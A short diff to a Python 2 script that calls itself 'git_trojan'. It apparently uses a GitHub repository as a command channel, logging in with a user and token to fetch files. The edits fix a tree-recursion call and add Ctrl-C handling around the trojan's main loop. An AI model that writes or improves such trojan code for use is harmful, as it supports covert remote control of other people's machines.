@@ -31,7 +31,7 @@ def connect_to_github(usr, pssword):
 def get_file_contents(filepath):
     global usr, psw
     gh,repo,branch = connect_to_github(usr, psw)
-    tree = branch.commit.commit.tree.recurse()
+    tree = branch.commit.commit.tree.to_tree().recurse()
 
     for filename in tree.tree:
         if filepath in filename.path:
@@ -119,5 +119,8 @@ if __name__ == "__main__":
     except IndexError:
         print "USE: git_trojan <user> <token> "
         sys.exit(0)
-    main_trojan_loop()
-    sys.exit(0)
+    try:
+        main_trojan_loop()
+    except KeyboardInterrupt:
+        print "Byeeee"
+        sys.exit(0)
